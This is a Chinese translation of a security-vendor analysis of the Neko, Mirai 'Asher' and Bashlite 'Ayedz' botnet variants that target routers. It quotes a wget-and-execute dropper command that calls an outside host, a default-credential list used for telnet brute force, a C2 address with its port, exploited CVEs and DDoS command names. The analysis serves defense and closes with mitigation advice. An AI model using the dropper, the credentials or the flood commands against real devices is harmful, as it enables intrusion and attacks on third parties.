@@ -1,0 +1,183 @@
+**近期发现了3款恶意软件变种——Neko，Mirai和Bashlite。在2019年7月22日，我们发现了Neko僵尸网络的恶意软件样本，并马上开始对其进行分析，接下来我们又发现了另外一个样本，相比之前增加了额外的漏洞利用方法。7月30日，又出现了一个名为“Asher”的Mirai变种，而在这之后，又发现了一个名为“Ayedz”的Bashlite变种。列出的这些恶意软件变种可以将路由器感染为僵尸网络中的设备，能够发起分布式拒绝服务（DDoS）攻击。**
+
+## Neko
+
+7月22日，我们的蜜罐检测到一个僵尸网络的恶意软件样本，x86.neko（被Trend
+Micro检测为Backdoor.Linux.NEKO.AB），该样本具有弱口令爆破的功能，之后会执行以下命令：
+
+    
+    
+    “cd /tmp/; wget hxxp://185.244.25.200/bins/x86.neko; chmod 777 x86.neko; ./x86.neko”  
+    
+
+我们的研究表明这个僵尸网络恶意软件在多种处理器架构下都有相应版本存在。根据分析，我们发现Neko僵尸网络能够执行多条后门指令：既能执行shell命令，又能发起UDP和UPD-HEX泛洪攻击，从而致瘫路由器正常处理和响应信息的能力。Neko还有结束进程（程序中的“killer”功能）的功能。同时其内部还存有一个可扩展的“死亡名单”——包含其他恶意软件相关的进程列表，如有存在即会结束相关进程。对Neko僵尸网络更深入的代码分析显示它还带有一个能够查找多种漏洞利用方式的扫描器，从而使其能够传染到其他有漏洞的设备中。
+
+> 1、Eir WAN端远程命令注入（TR-064）——Eir D1000路由器的一个广域网（WAN）端RCE漏洞
+>
+> 2、HNAP SOAPAction-Header 命令执行（CVE-2015-2051）——由错误处理恶意HTTP请求造成的多个D-> Link路由器的RCE漏洞
+>
+> 3、华为路由器HFG532——任意命令执行（CVE-2017-17215）——由验证某个配置文件不当造成的华为HG532上的RCE漏洞
+>
+> 4、GPON路由器——认证绕过/命令注入（CVE-2018-10561，CVE-2018-10562）——由认证绕过和命令注入造成的DASAN
+> GPON家用路由器的RCE漏洞
+>
+> 5、Linksys E系列——远程代码执行——由未经身份认证和操作系统命令注入造成的RCE漏洞
+>
+> 6、MVPower Shell命令执行——利用了MVPower数字视频录像机（DVRs）中未经身份认证的RCE漏洞
+>
+> 7、ThinkPHP 5.0.23/5.1.31 RCE ——开源web开发框架ThinkPHP 5.0.23/5.1.31的RCE漏洞
+>
+> 8、Realtek SDK – Miniigd UPnP SOAP 命令执行（CVE-2014-8361）——使用了Realtek
+> SDK中的miniigd程序的设备，由未经身份认证和操作系统命令注入造成RCE漏洞
+
+除了以上的漏洞利用，我们还发现Neko僵尸网络同时扫描了有漏洞的Africo设备。我们还无法确定Neko为了扫描哪款Africo设备，同时我们注意到这一扫描和任何一个漏洞利用都没有什么联系。但是，我们发现这一漏洞的结构和网件DGN1000/DGN2200等DGN设备的未认证RCE漏洞有相似之处。
+
+![africo-copy.png](https://image.3001.net/images/20190816/1565917181_5d55fffd7fd75.png!small)图1
+Neko僵尸网络恶意软件代码显示其是如何扫描Africo设备的
+
+7月29日，蜜罐收集到了一个升级的Neko僵尸网络恶意软件样本（检测为Backdoor.Linux.NEKO.AC）。这一次，文件使用了UPX进行加壳保护，并把UPX的特征魔数（UPX！）进行了修改，从而防止被脱壳。
+
+![fig-2.png](https://image.3001.net/images/20190816/1565917371_5d5600bbe8b7e.png!small)图2
+UPX加壳并修改了UPX特征魔数的Neko僵尸网络恶意软件代码
+
+我们发现这个新的样本的扫描功能更加强大了，并且使用了更多的漏洞利用方式进行感染传播。有趣的是，其漏洞利用列表现已加入网件DGN1000/DGN2200——而该漏洞结构和之前说的Africo扫描具有相似之处。![Netgear.png](https://image.3001.net/images/20190816/1565917418_5d5600ea59408.png!small)
+
+图3 Neko僵尸网络恶意软件代码显示其是如何扫描网件DGN1000/DGN2200的
+
+新版本的Neko也对多种CCTV-DVR设备和网件R7000、R6400路由器（2016-6277）进行了扫描。
+
+![1.PNG](https://image.3001.net/images/20190816/1565917494_5d560136a4a06.png!small)图4和图5
+Neko僵尸网络恶意软件代码显示其是如何扫描
+
+多种CCTV-DVR设备和网件R7000、R6400路由器的
+
+Neko变种对“awsec”也进行扫描，而这一漏洞结构和Vacron NVR RCE相似。
+
+![1.PNG](https://image.3001.net/images/20190816/1565921832_5d5612284cbc3.png!small)图6
+Neko僵尸网络恶意软件代码显示其是如何扫描“awsec”的
+
+此外，该Neko变种还会尝试扫描“cisco”和“wap54g”。但是，根据分析，这两条命令都无法成功实现漏洞利用。“Cisco”尝试使用CVE-2018-15379——Cisco
+Prime Infrastructure中的HTTP
+web服务器存在目录权限配置不当的问题，从而导致RCE。但是该样本中的攻击载荷未使用正确的URL路径，因此漏洞利用没有成功。
+
+![1.PNG](https://image.3001.net/images/20190816/1565921910_5d56127636168.png!small)
+
+图7 Neko僵尸网络恶意软件代码显示其是如何扫描“cisco”的
+
+“wap54g”攻击载荷的HTTP头和消息体格式也出现了问题，可能导致了对Linksys WAP54Gv3远程调试Root Shell漏洞的利用失败。
+
+![1.PNG](https://image.3001.net/images/20190816/1565921947_5d56129beb189.png!small)图8
+Neko僵尸网络恶意软件代码显示其是如何扫描“wap54g”的  
+
+## Mirai变种“Asher”  
+
+7月30日，发现了另一个路由器恶意软件——Mirai变种（被Trend
+Micro检测为Backdoor.Linux.MIRAI.VWIRC）。类似与Mirai，该变种会感染带有Busybox的设备，Busybox是一个为资源有限的设备提供的软件集。该变种会首先检查有无Busybox——执行“/bin/busybox
+{any string}”命令，如果设备系统给出响应“{any string} applet not
+found”，恶意软件就会继续它的操作。该变种的作者使用{any string}的部分来给恶意软件命名，在这个样本中，使用的是“Asher”。  
+
+![1.PNG](https://image.3001.net/images/20190816/1565922019_5d5612e37c435.png!small)图9
+检查BusyBox是否存在的命令截图
+
+“Asher”变种能够通过爆破以下telnet登录口令的方式对路由器进行渗透：
+
+    
+    
+    12345
+    2011vsta
+    2601hx
+    4321
+    admin
+    daemon
+    default
+    guest
+    OxhlwSG8
+    pass
+    password
+    root
+    S2fGqNFs
+    support D13hh[
+    synnet
+    t0talc0ntr0l4!
+    taZz@23495859
+    tlJwpbo6
+    vizxv
+    xc3511  
+    
+
+我们发现Asher通过扫描以下路由器漏洞进行利用和传播。可以看到它和Neko存在两个相似的漏洞利用：  
+
+![1.PNG](https://image.3001.net/images/20190816/1565922132_5d5613541e471.png!small)图10
+Asher样本扫描的漏洞
+
+1、GPON路由器——认证绕过/命令注入（CVE-2018-10561，CVE-2018-10562）——由认证绕过和命令注入造成的DASAN
+GPON家用路由器的RCE漏洞
+
+2、MVPower Shell命令执行——利用了MVPower DVR TV-7104HE 1.8.4
+115215B9数字视频录像机中未经身份认证的RCE漏洞
+
+3、Realtek SDK – Miniigd UPnP SOAP 命令执行（CVE-2014-8361）——使用了Realtek
+SDK中的miniigd程序的设备，由未经身份认证和操作系统命令注入造成RCE漏洞
+
+##
+![1.PNG](https://image.3001.net/images/20190816/1565922205_5d56139d6b0a7.png!small)Bashlite变种“Ayedz”  
+
+8月6日，检测到又一个路由器上的僵尸网络恶意软件样本，而这次是一个Bashlite的变种（被Trend
+Micro检测为Backdoor.Linux.BASHLITE.SMJC，Backdoor.Linux.BASHLITE.SMJC8，和Backdoor.Linux.BASHLITE.SMJC4），基于这个恶意软件的文件名，我们推测它为“Ayedz”
+。执行时，Ayedz会通过46216端口发送有关感染设备的以下信息，给IP地址为167[.]71[.]7[.]231的主机：  
+
+![1.PNG](https://image.3001.net/images/20190816/1565922251_5d5613cbad93e.png!small)图14
+Bashlite变种Ayedz用来回传信息所使用的命令  
+
+1、设备——如果“/usr/sbin/telnetd”文件存在，则其“getDevice”功能会返回一个“SSH”字符串，否则会返回一个“Uknown
+Device”字符串
+
+2、文件——设备是否存在任何下列的文件：
+
+/usr/bin/python
+
+/usr/bin/python3
+
+/usr/bin/perl
+
+3、Linux发行版本——当感染设备的Linux版本时openSUSE，Red Hat Enterprise
+Linux（RHEL），CentOS，Gentoo Linux，Ubuntu，Debian， 或者未知
+
+4、端口——如果找到了上述的4个文件，其“getPorz”功能返回会一个“22”字符串，否则返回“Uknown Device”字符串
+
+对Ayedz样本的分析显示，它能够运行多个发起DDoS攻击的后门指令。我们也发现Ayedz提供了多个攻击/泛洪选项和其他命令，例如：  
+
+    
+    
+    CLOUDFLARE – 绕过CloudFlare保护的HTTP泛洪
+    CNC – 设置C&C
+    HTTP – HTTP 泛洪
+    RAID – STD + TCP 泛洪
+    STD – STD 泛洪
+    STOMP – STD + UDP 泛洪
+    STOP – 停止僵尸行为
+    TCP – TCP SYN 泛洪
+    UDP – UDP 泛洪
+    UPDATE –从C&C进行更新  
+    
+
+## 解决方案
+
+保护路由器免受类似Neko，Mirai和Bashlite等恶意软件的威胁
+
+尽管厂商在保护路由器和其他设备的安全性上扮演着很重要的角色，用户和商业用户也需采用良好的安全习惯来抵御类似Neko，Mirai和Bashlite等恶意软件：
+
+> 1、选择一个会持续给产品打补丁的值得信赖的厂商
+>
+> 2、经常升级设备（如路由器）固件和软件，经常更换用来登录这些设备的口令
+>
+> 3、使用加密，确保设备连接安全
+>
+> 4、配置路由器，使其更好抵御攻击行为
+>
+> 5、禁用设备中过期或不必要的组件，仅使用来自可信源的合法应用
+>
+> 6、在家庭网络和接入的设备中部署提供额外安全保护的工具
+
+ ***参考来源：[trendmicro](https://blog.trendmicro.com/trendlabs-security-intelligence/back-to-back-campaigns-neko-mirai-and-bashlite-malware-variants-use-various-exploits-to-target-several-routers-devices/)，由Kriston编译，转载请注明来自FreeBuf.COM**
+
